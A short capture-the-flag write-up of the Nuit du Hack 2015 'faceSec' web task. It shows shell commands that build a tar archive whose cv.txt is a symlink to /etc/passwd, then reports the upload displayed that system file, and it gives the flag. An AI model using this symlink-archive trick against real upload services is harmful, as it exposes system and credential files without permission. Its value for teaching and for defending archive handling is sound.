# Nuit du Hack Quals CTF 2015: faceSec

**Category:** Web
**Points:** 100
**Solves:** 85
**Description:** 

> "Hello there,
> 
> We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?
> 
> Thanks,
> 
> faceSec HR Director."
> 
> <http://facesec.challs.nuitduhack.com/>

___

## Write-up

This task is a web task worth 100 points from the [Nuit du Hack qualifications](http://quals.nuitduhack.com/).<br>
We are given a website that lets you upload txt files for a cover letter, and a motivation letter. (cv.txt, motiv.txt).<br>
It is also possible to a tar file containing both files.<br>
Once you uploaded them, you can see them in your profile.<br>
It is possible to add symlinks to a tar file. We tried to put a symlink to /etc/passwd, and uploaded it.

```bash
xer@suicune:~/www/writeup/2015/ndh$ ln -s /etc/passwd cv.txt
xer@suicune:~/www/writeup/2015/ndh$ echo -ne "The game" > motiv.txt
xer@suicune:~/www/writeup/2015/ndh$ tar cvf pwn.tar *.txt
cv.txt
motiv.txt
```


It worked.

![Alt text](http://i.imgur.com/H0EdL25.png)<br>
_/etc/passwd_

__Flag:__ W00tSymL1nkAttackStillW0rksIn2k15

— XeR
